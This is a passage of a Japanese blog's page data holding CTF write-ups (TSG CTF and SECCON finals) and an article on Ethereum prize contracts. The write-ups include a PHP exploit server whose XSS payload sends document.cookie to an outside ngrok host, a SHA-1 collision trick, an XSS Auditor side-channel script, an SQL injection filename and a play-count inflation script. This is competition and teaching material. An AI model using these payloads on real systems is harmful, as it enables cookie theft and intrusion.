{"pageProps":{"tag":"CTF","entries":[{"type":"article","slug":"27","body":"[TSG CTF](https://ctftime.org/event/758)にチームNaruseJunで出ました。4099ptsを獲得して3位でした。\n\n[TSG CTF](https://ctftime.org/event/758)\n\n私はWeb問のみを解きました。以下write-upです。\n\n# BADNONCE Part 1 (247pts)\n\nCSPが有効になっているページでXSSしてCookieを盗ってください、という問題でした。\n\n```html\n<meta http-equiv=\"Content-Security-Policy\" content=\"script-src 'nonce-<?= $nonce ?>';\">\n```\n\n問題名が **BADNONCE** なので明らかにnonceの実装が悪そうです。\n実際、以下のようにセッションIDに対してnonceが固定なので、これが漏れるとXSSが可能になります。\n\n```php\nsession_start();\n$nonce = md5(session_id());\n```\n\n件のnonceは、ページ内の要素の属性として存在しています。\n\n```html\n<script nonce=<?= $nonce ?>>\n\t\t\t\tconsole.log('Welcome to the dungeon :-)');\n</script>\n```\n\nところで、このページでは`script-src`のみ制限されているので、たとえばスタイルシートなどは外部ソースから読み込み放題です。\nしたがって、CSS Injectionが可能です。セレクタを工夫することによって、要素の属性値を特定することができますね。\n\n[CSS Injection 再入門 – やっていく気持ち](https://diary.shift-js.info/css-injection/)\n\nただし、管理者のブラウザを模したクローラは、毎回異なるPHPSESSIDを持つため、1度の起動で最後までnonceを抜きとって、XSSを踏ませるところまでやらないといけません。\nちょっと面倒ですが、管理者に攻撃車が用意したURLをIFRAMEで開き続けるページを踏ませて、InjectするCSSを変えながら、最終的にXSSを発火させるようにしました。\n以下のような実装になりました。Web問のExploitにしてはちょっと重めかも。もっと頭のいい方法が存在する可能性もあり。\n\n```php\n<?php\n\tif (array_key_exists(\"save\", $_GET)) {\n\t\tfile_put_contents(\"flag.txt\", $_GET[\"save\"] . PHP_EOL, LOCK_EX | FILE_APPEND);\n\t}\n\telse if (array_key_exists(\"nonce\", $_GET)) {\n\t\t$nonce = file_get_contents(\"nonce.txt\");\n\t\tif (strlen($nonce) < strlen($_GET[\"nonce\"])) {\n\t\t\tfile_put_contents(\"nonce.txt\", $_GET[\"nonce\"], LOCK_EX);\n\t\t}\n\t}\n\telse if (array_key_exists(\"css\", $_GET)) {\n\t\theader(\"Content-Type: text/css\");\n\t\techo(\"script { display: block }\" . PHP_EOL);\n\n\t\t$nonce = file_get_contents(\"nonce.txt\");\n\t\t$chars = str_split(\"0123456789abcdef\");\n\n\t\tforeach ($chars as $c1) {\n\t\t\tforeach ($chars as $c2) {\n\t\t\t\t$x = $nonce . $c1 . $c2;\n\t\t\t\techo(\"[nonce^='\" . $x . \"'] { background: url(http://cf07fd07.ap.ngrok.io/?nonce=\" . $x . \") }\" . PHP_EOL);\n\t\t\t}\n\t\t}\n\t}\n\telse if (array_key_exists(\"go\", $_GET)) {\n\t\t$nonce = file_get_contents(\"nonce.txt\");\n\t\tif (strlen($nonce) < 32) {\n\t\t\theader(\"Location: http://35.187.214.138:10023/?q=%3Clink%20rel%3D%22stylesheet%22%20href%3D%22http%3A%2F%2Fcf07fd07.ap.ngrok.io%2F%3Fcss%3D\" . microtime(true) . \"%22%3E\");\n\t\t}\n\t\telse {\n\t\t\theader(\"Location: http://35.187.214.138:10023/?q=%3Cscript%20nonce%3D%22\" . $nonce . \"%22%3Efetch(%22http%3A%2F%2Fcf07fd07.ap.ngrok.io%2F%3Fsave%3D%22%20%2B%20encodeURIComponent(document.cookie))%3C%2Fscript%3E\");\n\t\t}\n\t}\n\telse if (array_key_exists(\"start\", $_GET)) {\n\t\tfile_put_contents(\"nonce.txt\", \"\", LOCK_EX);\n\t\tfile_put_contents(\"flag.txt\", \"\", LOCK_EX);\n?>\n<html>\n<body>\n<script>\n\tsetInterval(() => {\n\t\tconst iframe = document.createElement(\"iframe\");\n\t\tiframe.src = `?go=${(new Date).getTime()}`;\n\t\tdocument.body.appendChild(iframe);\n\t}, 256);\n</script>\n</body>\n</html>\n<?php\n\t}\n\telse {\n\t\techo(\"E R R O R !\");\n\t}\n?>\n```\n\n# Secure Bank (497pts)\n\nrubyで書かれたアプリケーションで、コインの送受信ができます。\nたくさんのコインを集めれば、FLAGが入手できるようです。\n\n```ruby\n  get '/api/flag' do\n    return err(401, 'login first') unless user = session[:user]\n\n    hashed_user = STRETCH.times.inject(user){|s| Digest::SHA1.hexdigest(s)}\n\n    res = DB.query 'SELECT balance FROM account WHERE user = ?', hashed_user\n    row = res.next\n    balance = row && row[0]\n    res.close\n\n    return err(401, 'login first') unless balance\n    return err(403, 'earn more coins!!!') unless balance >= 10_000_000_000\n\n    json({flag: IO.binread('data/flag.txt')})\n  end\n```\n\n怪しいのは送金コードで、こういう形。\n\n```ruby\n  post '/api/transfer' do\n    return err(401, 'login first') unless src = session[:user]\n\n    return err(400, 'bad request') unless dst = params[:target] and String === dst and dst != src\n    return err(400, 'bad request') unless amount = params[:amount] and String === amount\n    return err(400, 'bad request') unless amount = amount.to_i and amount > 0\n\n    sleep 1\n\n    hashed_src = STRETCH.times.inject(src){|s| Digest::SHA1.hexdigest(s)}\n    hashed_dst = STRETCH.times.inject(dst){|s| Digest::SHA1.hexdigest(s)}\n\n    res = DB.query 'SELECT balance FROM account WHERE user = ?', hashed_src\n    row = res.next\n    balance_src = row && row[0]\n    res.close\n    return err(422, 'no enough coins') unless balance_src >= amount\n\n    res = DB.query 'SELECT balance FROM account WHERE user = ?', hashed_dst\n    row = res.next\n    balance_dst = row && row[0]\n    res.close\n    return err(422, 'no such user') unless balance_dst\n\n    balance_src -= amount\n    balance_dst += amount\n\n    DB.execute 'UPDATE account SET balance = ?  WHERE user = ?', balance_src, hashed_src\n    DB.execute 'UPDATE account SET balance = ?  WHERE user = ?', balance_dst, hashed_dst\n\n    json({amount: amount, balance: balance_src})\n  end\n```\n\nぱっと見たところ、トランザクションを考慮していないので、高頻度でリクエストを飛ばせばRace Conditionで二重送金ができそうだったんですが、軽く試したところ、タイミングがシビアでほとんどうまくいかなかったので、この方針は諦めました。\n\nところで、このコードをもう少しよく見ると、宛先と送金元が同一のユーザであったとき、コインが増殖することは明らかです。\nもちろん、自分自身への送金はエラーになる実装となっているんですが、残高の照会をユーザ名をハッシュした値で行っているのに対して、ユーザの同一性判定は元の文字列で行っています。\nつまりは、別の文字列であって、SHA1ハッシュの結果が同一になる文字列の組がもし存在すれば、無限にコインを増やすことができそうです。\n\nSHA1の衝突といえば……[SHAttered](https://shattered.io/)ですよね。\n詳しい理屈はググってもらうとして、これを用いれば、先に述べた要件を満たすような文字列（というかバイト列）の組が用意できます。\n\nJSONとしてnon-printableな文字を送る際に破壊されないように注意しつつ、以下のようにして用意しました。\n\n```php\n<?php\n\t$s1 = file_get_contents(\"shattered-1.pdf\");\n\t$s2 = file_get_contents(\"shattered-2.pdf\");\n\n\t$t1 = substr($s1, 0, 320) . \"narusejun\";\n\t$t2 = substr($s2, 0, 320) . \"narusejun\";\n\n\techo(sha1($t1) . PHP_EOL);\n\techo(sha1($t2) . PHP_EOL);\n\n\tfunction toStr($c) {\n\t\t$i = ord($c);\n\t\tif ($c == '\"') {\n\t\t\treturn '\\\\\"';\n\t\t}\n\t\tif ($c == '%') {\n\t\t\treturn '%%';\n\t\t}\n\t\tif ($i < 0x20) {\n\t\t\treturn sprintf(\"\\\\u%04x\", $i);\n\t\t}\n\t\tif ($i < 0x7F) {\n\t\t\treturn $c;\n\t\t}\n\t\treturn sprintf(\"\\\\x%02x\", ord($c));\n\t}\n\t$u1 = implode(array_map(toStr, str_split($t1)));\n\t$u2 = implode(array_map(toStr, str_split($t2)));\n\n\techo($u1 . PHP_EOL);\n\techo($u2 . PHP_EOL);\n?>\n```\n\nこの文字列のどちらかを使って登録した上で、もう一方の文字列を宛先として指定して送金すると、コインが増殖します。\ncurlを使うと容易です。\n\n# RECON (500pts)\n\nWeb問です。PHPで実装された、プロフィールを登録できるサービスです。\n秘密の質問として20種類のフルーツが好きか否かを選択できるようになっていて、どうやらadminの好きなフルーツをRECONすれば良いみたいです。\n\nソースコードを見ると、自身のプロフィールを確認するページで露骨にCSPが弱められていて、怪しさがあります。\n\n```php\n$response->withHeader(\"Content-Security-Policy\", \"script-src-elem 'self'; script-src-attr 'unsafe-inline'; style-src 'self'\")\n```\n\nこの要素は新しい機能なので、`script-src-elem`と`script-src-attr`が効いていなくて、実質XSSし放題になっているようでした。\nしかしながら、このページはログインしたユーザ自身のプロフィールを表示するものですので、狙った相手にコードを実行させるのは厳しそうな雰囲気があります。\n\nところで、そもそも何故`script-src-attr`などという特殊な(?)制限が付されているのでしょうか？\nこの答えは、このページのソースを注意深く見るとすぐに気が付きました。\n\n```html\n🍇 <input type=\"checkbox\" id=\"grapes\" onchange=\"grapes.checked=false;\" >\n🍈 <input type=\"checkbox\" id=\"melon\" onchange=\"melon.checked=false;\" >\n🍉 <input type=\"checkbox\" id=\"watermelon\" onchange=\"watermelon.checked=false;\" >\n🍊 <input type=\"checkbox\" id=\"tangerine\" onchange=\"tangerine.checked=false;\" >\n🍋 <input type=\"checkbox\" id=\"lemon\" onchange=\"lemon.checked=false;\" >\n🍌 <input type=\"checkbox\" id=\"banana\" onchange=\"banana.checked=false;\" >\n🍍 <input type=\"checkbox\" id=\"pineapple\" onchange=\"pineapple.checked=false;\" >\n🍐 <input type=\"checkbox\" id=\"pear\" onchange=\"pear.checked=false;\" >\n🍑 <input type=\"checkbox\" id=\"peach\" onchange=\"peach.checked=false;\" >\n🍒 <input type=\"checkbox\" id=\"cherries\" onchange=\"cherries.checked=false;\" >\n🍓 <input type=\"checkbox\" id=\"strawberry\" onchange=\"strawberry.checked=false;\" >\n🍅 <input type=\"checkbox\" id=\"tomato\" onchange=\"tomato.checked=false;\" >\n🥥 <input type=\"checkbox\" id=\"coconut\" onchange=\"coconut.checked=false;\" >\n🥭 <input type=\"checkbox\" id=\"mango\" onchange=\"mango.checked=false;\" >\n🥑 <input type=\"checkbox\" id=\"avocado\" onchange=\"avocado.checked=false;\" >\n🍆 <input type=\"checkbox\" id=\"aubergine\" onchange=\"aubergine.checked=false;\" >\n🥔 <input type=\"checkbox\" id=\"potato\" onchange=\"potato.checked=false;\" >\n🥕 <input type=\"checkbox\" id=\"carrot\" onchange=\"carrot.checked=false;\" >\n🥦 <input type=\"checkbox\" id=\"broccoli\" onchange=\"broccoli.checked=false;\" >\n🍄 <input type=\"checkbox\" id=\"mushroom\" onchange=\"mushroom.checked=false;\" >\n```\n\n秘密の質問がプロフィールページに表示されているんですが、この変更を禁止する目的でJavaScriptが用いられているのでした！\nこのコードのみ実行できるようにする目的で、部分的なunsafe-inlineが許容されていたようです。\n\nもし、この小さなJavaScriptコードを盗むことができれば、adminの好きなフルーツを知ることできそうです。\nこのページでは、`X-XSS-Protection: 1; mode=block`というヘッダが送信されていて、XSS Auditorがブロックモードで動作することが期待されていて、adminのブラウザもこれに従っているでしょう。\nこういう場合に、XSS Auditorの誤検出を利用して、ページ内のスクリプトを盗む手法が存在します。\n\n[ブラウザのXSSフィルタを利用した情報窃取攻撃 | MBSD Blog](https://www.mbsd.jp/blog/20160407_2.html)\n\nこれを利用できそうです。（できました。）\n以下のような2つのIFRAMEを表示させれば、どちらか一方をXSS Auditorがブロックするはずです。\n\n```html\n<iframe src='http://34.97.74.235:10033/profile?onchange=\"melon.checked=true;\"'></iframe>\n<iframe src='http://34.97.74.235:10033/profile?onchange=\"melon.checked=false;\"'></iframe>\n```\n\nこの性質を利用し、攻撃者のページで2つのIFRAMEを開かせて、どちらがブロックされたかを判別すれば良いですね。\nIFRAME要素の`contentWindow.length`を見ると、XSS Auditorが作動したか否かを簡単に判別できるようでしたが、手元で試したときに何故かうまくいかなかったので（これは勘違いだったかもしれませんが）、`onload`が発火するまでの時間を計測するちょっと面倒な方法で判別しています。\nXSS Auditorが作動すると、関連リソースの読み込みが走らないので、`onload`が早く呼ばれるはずです。\n\n以下のように実装し、IFRAMEをプロフィールに埋め込んで、adminにアクセスさせました。\nJavaScriptの記法モダンだったりレガシーだったりしていて、気持ち悪いんですが、終了ギリギリで解いていたためいろいろ焦っていて、見当違いの試行錯誤をしていた名残です。\n\n```php\n<?php\n\tif(array_key_exists(\"save\", $_GET)){\n\t\tfile_put_contents(\"save.txt\", $_GET[\"save\"] . PHP_EOL, FILE_APPEND | LOCK_EX);\n\t\techo(\"OK!\");\n\t}else{\n?>\n<html>\n<body>\n<script>\n\nfunction test(key, val){\n\treturn new Promise(function(resolve){\n\t\tconst iframe = document.createElement(\"iframe\");\n\t\tiframe.onload = function(){\n\t\t\tiframe.remove();\n\t\t\tresolve([key, val, new Date().getTime() - time]);\n\t\t};\n\t\tiframe.src = `http://34.97.74.235:10033/profile?onchange=\"${key}.checked=${val};\"`;\n\t\tconst time = new Date().getTime();\n\t\tdocument.body.appendChild(iframe);\n\t});\n}\n\n(async () => {\n\tconst results = [];\n\tfor(let i = 0; i < 1; i++){\n\t\tresults.push([\n\t\t\tawait test(\"mushroom\", true),\n\t\t\tawait test(\"mushroom\", false),\n\t\t]);\n\t}\n\tlocation.href = \"?save=\" + results;\n})();\n</script>\n</body>\n</html>\n<?php\n\t}\n?>\n```\n\nこれを用いて、フルーツ1種類ごとに計測した結果が以下のとおりです。\nCaptchaを連打する必要があって、激ツラかったです。チームメイトにひたすらCaptchaしてもらいました。（もっと頭の良い実装をすればよかった気もしますが。）\n\n| フルーツ | trueのonload(ms)| falseのonload(ms) | 判定結果 |\n| --- | --- | --- | --- |\n| grapes | 84 | 334 | TRUE |\n| melon | 347 | 65 | FALSE |\n| watermelon | 245 | 47 | FALSE |\n| tangerine | 78 | 394 | TRUE |\n| lemon | 83 | 418 | TRUE |\n| banana | 73 | 255 | TRUE |\n| pineapple | 79 | 452 | TRUE |\n| pear | 252 | 48 | FALSE |\n| peach | 74 | 281 | TRUE |\n| cherries | 76 | 336 | TRUE |\n| strawberry | 79 | 318 | TRUE |\n| tomato | 77 | 353 | TRUE |\n| coconut | 77 | 333 | TRUE |\n| mango | 92 | 404 | TRUE |\n| avocado | 254 | 47 | FALSE |\n| aubergine | 85 | 333 | TRUE |\n| potato | 249 | 46 | FALSE |\n| carrot | 72 | 321 | TRUE |\n| broccoli | 428 | 40 | FALSE |\n| mushroom | 87 | 388 | TRUE |\n\nあとは、この結果を用いてadminのrecoveryメッセージ（FLAG）を表示させることができました。\n\n# 総括\n\nWeb問しか触っていないので他のジャンルはわかりかねますが、良い問題でした。\n\n- 誘導が適切で、guessが最小限で済んだ\n- 扱っているテーマも面白いものだった\n\nおわりです。\nなんか💰を貰えるらしいので、焼肉にでも行きたいです🐦\n\nhttps://twitter.com/tsgctf/status/1124933926202560512\n","title":"TSG CTF write-up (Web)","image":null,"tags":["CTF","参加記"],"date":"2019-05-05T00:00:00.000Z","updated":"2021-01-07T13:52:12.000Z"},{"type":"article","slug":"26","body":"この記事は[CTF Advent Calendar 2018](https://adventar.org/calendars/3210)の23日目の記事です！\n\n[CTF Advent Calendar 2018](https://adventar.org/calendars/3210)\n\n本稿では、Ethereumスマートコントラクトを用いて、CTF（に限らず、様々なイベント）の賞金支払いをどう行うか？を検討してみます。\n\n## はじめに\n\n[**Capture The Flag**](https://ja.wikipedia.org/wiki/%E3%82%AD%E3%83%A3%E3%83%97%E3%83%81%E3%83%A3%E3%83%BC%E3%83%BB%E3%82%B6%E3%83%BB%E3%83%95%E3%83%A9%E3%83%83%E3%82%B0#%E3%82%B3%E3%83%B3%E3%83%94%E3%83%A5%E3%83%BC%E3%82%BF%E3%82%BB%E3%82%AD%E3%83%A5%E3%83%AA%E3%83%86%E3%82%A3)においては、その上位者に賞金が支払われる大会がしばしば開催されている。\n\nこうしたCTFをはじめとする各種賞金付き大会において、その賞金の支払いを**DApps**を用いて行う事を考える。\n\n## DAppsを用いる意義\n\n- 確かに賞金が用意されていることを証明できる\n- 主催者が賞金を支払う意志があることをアピールできる\n- 入賞者自身が引き出しを行うので、支払いの手間がかからない\n\n# DAppsを用いた賞金付きCTF\n\n今回は簡単化のため、**優勝者のみに賞金が支払われ**、**問題数は1つ**（正解のFLAGが1つ）の単純な大会を想定とする。\nまた、優勝者は「FLAGを入手し、賞金支払い手続きを最も早く行った参加者」と定義する。\n\nDAppsやブロックチェーンなど、分散基盤上で「賞金支払い」を行う場合に、大きく問題となるのが**未受理トランザクション**の存在である。\n要は、未受理のままネットワーク（mempool）を漂っているトランザクションをコピーしてより高い手数料を付与すれば、最初にトランザクションを投入した参加者の賞金受け取り権利を横取りできてしまう、という話である。\n\n優勝者が**必ず、もしくは極めて高い確率で賞金を手にする**ことができるDAppsを考えてみよう。\n\n## 従来手法\n\n### [1]: [Bitcoinによる新しいCapture The Flag（CTF）](https://qiita.com/yyu/items/b6f367eb876dd28e759a)\n\n[Bitcoinによる新しいCapture The Flag（CTF）](https://qiita.com/yyu/items/b6f367eb876dd28e759a)\n\nこの手法では、FLAG検証に参加者固有の値を用いることで先述の問題を解決している。\nブロックチェーン上に**各参加者ごとに固有のFLAGハッシュ**を予め記憶しておくことで、検証を行う。\n\nチーム$T_i$はFLAG文字列$F$を入手すると、$h_i=H(F||i)$を含むトランザクションを提出する。$H$は適当なハッシュ関数である。\nこのトランザクションに対し、予め記録されている$ans_i=H(h_i)$と比較することで正しいFLAGを持っているか検証できる。\n仮にチーム$T_j$がこのトランザクションをコピーしても、チーム$T_j$に対する正解$ans_j$は$ans_i$と異なるため、正解とみなされない。\nまた、$h_i$を入手してもハッシュの原像計算困難性により、$F$は入手できない。\n\nEthereumを用いて実装した例もある。\n\n[Solidityで作るCapture The Flag](http://lotz84.hatenablog.com/entry/2018/01/02/134056)\n\nしかし、[1]では**予めCTFイベントへの参加者が確定している**必要があり、開始時刻以降は参加者を追加できない。\n開催中にイベントの存在を知ったユーザが新たに参加できず、ユーザビリティを欠いている。\n\n### [2]: [ERC20トークンを用いた宝探しゲーム(真)の提案](https://trap.jp/post/561/)\n\n[ERC20トークンを用いた宝探しゲーム(真)の提案](https://trap.jp/post/561/)\n\nこの手法では、テーマとして「宝探し」を取り扱っているが、秘密の文字列を何らかの手段によって入手した参加者に報奨を与えるという点で、\n**お宝**を**FLAG**に、**ERC20トークン**を**賞金**と読み替えれば、CTFにおける賞金支払いに応用可能である。\n\n基本的なアイデアは[1]とほぼ同等で、**各参加者ごとに固有のFLAGハッシュ**がスマートコントラクト上に記録されている。\n\n[1]と異なるの　は、後から参加者の追加を可能としている点である。\n[1]がBitcoinの`scriptPubKey`で記述されているのに対して、[2]ではEthereumスマートコントラクト上で実装しているため、より柔軟なDAppsが記述できている。\n\nしかしながら、[2]では参加者の追加をするために**主催者が手数料を支払う必要がある**。\n一度デプロイが完了した後にも、コントラクトの面倒を見続ける必要があるのは欠点であると言えよう。\n\n加えて、DoS攻撃の余地がある。\nEthereumのEOAアドレスは無コストで生成可能であるので、何度も参加要求を送り続けければ、主催者のEthereumが枯渇してしまう。\nこれを防ぐには、何らかのオフチェーン要素とアドレスを紐付けて個人を特定する、CTFへの参加に手数料を徴収する、などが考えられる。\nしかし、これらは主催者側の負担が大きい。到底De-centralized Appsとは呼べるものではない！\n\nさらに、[2]では**主催者がこっそり賞金を自分の懐に収める**可能性を排除できない。\n[1]では、予め参加者を確定させておくことでこの問題をうまく回避している。\n\n## 提案手法\n\n提案手法では、**後から参加者が追加可能であり、その際に手数料を必要としない**ことを目標とする。\nまた、DAppsプラットフォームとしては、Ethereumスマートコントラクトを想定している。\n\n## [N案]: コミットメントによる引き出し\n\n本手法では、予めFLAGハッシュをコントラクト上に乗せることなく、検証時には参加者ごとに異なるFLAGハッシュを用いて検証することを目指す。\nこれを可能とするのが**コミットメント方式**である。コミットメントについては、[Wikipediaの解説](https://ja.wikipedia.org/wiki/%E3%83%93%E3%83%83%E3%83%88%E3%82%B3%E3%83%9F%E3%83%83%E3%83%88%E3%83%A1%E3%83%B3%E3%83%88)や[ブロックチェーンを利用した公平なガチャの提案](https://qiita.com/yyu/items/4eaa43693e39c60a8661)が詳しい。\n\nコントラクト上には、FLAG文字列$F$のハッシュ$F'=H(F)$を予め記録されている。$H$は適当なハッシュ関数である。\nまず、**commit**と**reveal**の2つの操作を定義する。\n\n**commit**は、言わば**賞金を引き出す権利の予約**である。\n参加者$T_i$は、FLAG文字列$F$を入手すると、自身のアドレス$A_i$を用いてコミット$C_i=H(F||A_i)$を送信する。\nコミット$C_i$は、コントラクト上に格納される。また、$C_i$は従来手法で予めコントラクト上に格納しておくものと等しい。\nこの時点では、トランザクションを観察しても$F$は復元困難である。これがコミットメント方式の**秘匿性**である。\n\n**reveal**は、**予約した権利が正当であることを証明**し、それを行使して**賞金を引き出す**操作である。\n参加者$T_i$は、FLAG文字列$F$を単に公開する。コントラクトは、$H(F)$を計算し、予め記録されている$F'$と比較して、FLAG文字列が正しいかを確認した後、\n$H(F||A_i)$を計算し、commit時に記録された$C_i$と比較を行うことで、**参加者はcommitの時点でこのFLAGを本当に所有していたのかを確認する**。\n以上で、commit時点で正しいことFLAGを所有していたことが確認されれば、直ちに賞金を支払う。\ncommit時に提出したFLAGは、reveal時に変更できない。これがコミットメント方式の**拘束性**である。\n\nコミットメント方式による賞金支払いでは、**revealした瞬間にFLAG文字列が全員に対して明らかになる**点に注意が必要である。\nそのため、検証を2段階に分けたとしても、誰かがrevealした瞬間に高手数料でcommitし、すぐにrevealすれば逆転可能性がある。\n\nこの手法のキモは、**commitから一定時間（ブロック高）が経過しないとrevealできない**ような制約を設けることにある。\nこれによって、revealトランザクションを投入した瞬間から一定時間内は、**攻撃者は絶対に引き出しができない**。\nしたがって、この一定時間内にrevealトランザクションが承認されれば良いため、極めて高い確率で**最も先にcommitした参加者に**賞金が支払われる。\n一定時間の遅延は、言わば攻撃者の賞金引き出し操作を遅延させるために存在するものと言える。\n\nSolidityによる実装例は以下。\n\n```js\npragma solidity ^0.5.0;\n\ncontract Prize {\n\tevent Commit(address sender, uint revealable);\n\n\tbytes32 private flagHash;\n\n\tmapping(address => bytes32) private commits;\n\tmapping(address => uint) private revealable;\n\n\tconstructor(bytes32 _flagHash) public payable {\n\t\tflagHash = _flagHash;\n\t}\n\n\tfunction commit(bytes32 commitment) external {\n\t\tcommits[msg.sender] = commitment;\n\t\temit Commit(msg.sender, revealable[msg.sender] = block.number + 128);\n\t}\n\tfunction reveal(bytes32 flag) external {\n\t\trequire(calcFlagHash(flag) == flagHash);\n\t\trequire(calcCommitment(flag, msg.sender) == commits[msg.sender]);\n\t\trequire(block.number >= revealable[msg.sender]);\n\t\tselfdestruct(msg.sender);\n\t}\n\n\tfunction calcFlagHash(bytes32 flag) public pure returns(bytes32) {\n\t\treturn keccak256(abi.encodePacked(flag));\n\t}\n\tfunction calcCommitment(bytes32 flag, address sender) public pure returns(bytes32) {\n\t\treturn keccak256(abi.encodePacked(flag, sender));\n\t}\n}\n```\n\n## [A案]: コミットメントによる権利移転\n\n[N案]では、要件を満たす賞金支払いDAppsを定義したが、この方式には1点課題が残る。\nそれは、**一定時間が経過しなくてもrevealできてしまう**点である。\n\nこの場合、正しく実装されたコントラクトでは、支払いは行われず、**FLAGが想定より早く公開されてしまう**。\n一定時間が経過する前にrevealした参加者は、我々が苦心して用意した権利保護期間を自ら捨て去ってしまったことになるのだ！\n\n[N案]を拡張し、こうした誤操作が起こりえない、言わばフールプルーフ的な構造を取り入れたのが[A案]である。\n\n**commit**と**reveal**の2つに加えて、新たに**withdraw**操作を定義する。\n\n**commit**では、[N案]の$C_i$に加えて、commitした時刻（ブロック高）を記録しておく。\n\n**reveal**では、[N案]と同様の検証を行った後に、**権利の移転**を行う。\n[A案]では、コントラクト上で「現在の引き出し権利者」（優勝者）を記憶している。\n権利の移転とは、現在の権利者がcommitした時刻よりも、早い時刻にcommitした参加者がrevealした際に、権利を移動する操作である。\n\nそして**withdraw**は、引き出し権利を行使して賞金を引き出すものである。\nこの権利行使を遅延させるのが[A案]である。遅延は、「commit時から一定時間後」でもいいし「権利取得時から一定時間後」でも良い。\ncommit時から一定時間後としたほうが、参加者の待ち時間は短くなり、ユーザビリティが向上するだろう。\n\nこれによって、commit後に即時revealしても損をすることがない。\nrevealトランザクションを見てすぐさま権利を横取りしたとしても、withdrawの遅延によってすぐに引き出せないし、その間に正当権利者がrevealすれば良い。（commitが最も早いものが最終的な権利を得る。）\n\nSolidityによる実装例は以下。\n\n```js\npragma solidity ^0.5.0;\n\ncontract Prize {\n\tevent Commit(address sender, uint withdrawable);\n\tevent Reveal(address sender, uint withdrawable);\n\n\tbytes32 private flagHash;\n\taddress payable private winner;\n\n\tmapping(address => bytes32) private commits;\n\tmapping(address => uint) private withdrawable;\n\n\tconstructor(bytes32 _flagHash) public payable {\n\t\tflagHash = _flagHash;\n\t}\n\n\tfunction commit(bytes32 commitment) external {\n\t\tcommits[msg.sender] = commitment;\n\t\temit Commit(msg.sender, withdrawable[msg.sender] = block.number + 128);\n\t}\n\tfunction reveal(bytes32 flag) external {\n\t\trequire(calcFlagHash(flag) == flagHash);\n\t\trequire(calcCommitment(flag, msg.sender) == commits[msg.sender]);\n\t\trequire(winner == 0 || withdrawable[msg.sender] < withdrawable[winner]);\n\t\temit Reveal(winner = msg.sender, withdrawable[msg.sender]);\n\t}\n\tfunction withdraw() external {\n\t\trequire(msg.sender == winner);\n\t\trequire(block.number >= withdrawable[msg.sender]);\n\t\tselfdestruct(msg.sender);\n\t}\n\n\tfunction calcFlagHash(bytes32 flag) public pure returns(bytes32) {\n\t\treturn keccak256(abi.encodePacked(flag));\n\t}\n\tfunction calcCommitment(bytes32 flag, address sender) public pure returns(bytes32) {\n\t\treturn keccak256(abi.encodePacked(flag, sender));\n\t}\n}\n```\n\n## 提案手法の課題\n\n### 主催者による賞金回収\n\n[2]の問題として上げた以下の点は、解決できていない。\n\n> **主催者がこっそり賞金を自分の懐に収める**可能性を排除できない。\n\nしかし、後から参加者の追加を許す場合では、この可能性を排除することは極めて難しい。\nこの問題についてはとりあえずは目をつむって、主催者は信頼に足る人間である、ということにしておこう……！\n\n### 暗号通貨に価値があることを前提としている\n\nまぁいいじゃん。\nアゼルバイジャン。\n\n## おわりに\n\nコミットメントの持つ秘匿性・束縛性を活用し、後から参加者が追加可能であり、その際に手数料を必要としない賞金支払いコントラクトを提案した。\n\n### 謝辞\n\n本稿は、[@42_0N](https://twitter.com/42_0N)氏との長時間に渡る議論を経て書き上げたものです。\nありがとナス！！！！！！！！\n\n----\n\nところで、最近公開したミニCTF:[NaruseJunCTF](https://we.are.participating.in.seccon.international/)はプレイして頂けましたか？\nなんと、全問正解者には賞金があります！（2018/12/23 現在 まだ賞金は残ってます）\n賞金支払いには[N案]コントラクトを用いていますヨ。DAppsによる賞金受け取りを是非体験してみてくださいネ。\n","title":"DAppsによる賞金付きCTF","image":null,"tags":["CTF","DApps","Ethereum","アドベントカレンダー","スマートコントラクト"],"date":"2018-12-23T00:00:00.000Z","updated":"2021-01-07T09:09:45.000Z"},{"type":"article","slug":"22","body":"**NaruseJun**というチームでSECCON決勝に出ました。\n\n# 決勝\n\nボクは予選に出られなかったんですが、枠を譲っていただいて憧れのSECCON決勝に出ることができました！\n\nhttps://twitter.com/_n_ari/status/964678908242157569\n\n# 結果\n\n競技開始後すぐAttackPointを稼ぎ、しばらくは首位を独走していましたがその後停滞。\n午後にDefencePointでジリジリを順位を上げ首位に返り咲いたものの、終了間際で追い抜かれ**2位(準優勝)**で終了しました。\n**文部科学大臣賞 個人賞**も頂きました。\n\nhttps://twitter.com/yamaha_sn/status/964784430572232705\n\nhttps://twitter.com/yamaha_sn/status/964787478178615302\n\nhttps://twitter.com/sekai67/status/964792274025529345\n\n# Writeup\n\n## 府中\n\nWeb問？\nElectronで書かれた音楽系SNSで、曲をアップロードできたりするようです。\n\n### Attack\n\nアップロードする際のファイル名もDBに記録しているようで、ここにSQLインジェクション脆弱性があります。\n\n```sql\n', 0, (SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES LIMIT 0, 1)) -- .wav\n```\n\nのようなファイルを投げると、MariaDBが型エラーを吐き、そのエラーメッセージで内容がわかります。\n\nいろいろ見ていたんですが、特に怪しいテーブルも存在せず、さらにDBにアクセスしているユーザが`file`テーブル以外へのアクセス権を持っていないように見えました。\n（挑戦していたのが終了間近で焦っていたので、違ったかもしれない……）\n\nで、結局ここから先がわかりませんでした……\nここからuserテーブルのis_adminフラグを立てるとか、adminのパスワードを抜くとかでしょうか？\nわかりません。\n\n### Defence\n\n再生数ランキング上位の曲名にディフェンスキーワードを入れられると、DefencePointがもらえます。\n\n1アカウント辺り、1再生しかカウントされないので、ランキングを上げるにはアカウントを量産することが必要です。\n適当にPOSTを投げるとアカウントが作れるので、さほど難しくないです。\n\n再生数のカウントは、ストリーミングサーバから実際に曲ファイルを取得した際に行われていて、\nストリーミングサーバへのリクエストはTCP上の独自プロトコル？っぽいもので通信しています。\nアプリが実際に使っているソースコードは、Electronパッケージから簡単に抜けるので、これを使うと簡単。\n\n#### 再生数を増やすNode.js向けスクリプト\n\n```js\nvar PromiseSocket = require('promise-socket');\n\nasync function getWAV(streaming_host, streaming_port, song, api_key) {\n    return new Promise(async (resolve, reject) => {\n        const socket = new PromiseSocket();\n        await socket.connect({\n            host: streaming_host,\n            port: streaming_port\n        });\n        for(let i = 0; i < 100; i++){\n            // '\\x80': select song\n            await socket.write(\"\\x80\");\n            await socket.write(song['unique_id']);\n            await socket.write(api_key);\n            // '\\x82': get WAV File Headers\n            await socket.write(\"\\x82\");\n            await socket.write(\"\\x84\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\x7f\");\n            await socket.write(\"\\x81\");\n        }\n        // '\\x90': close connection\n        await socket.write(\"\\x90\");\n        // let result = (await socket.readAll());\n        let result = (await socket.end());\n        resolve(result);\n    });\n}\n\n\n(async _ => {\n    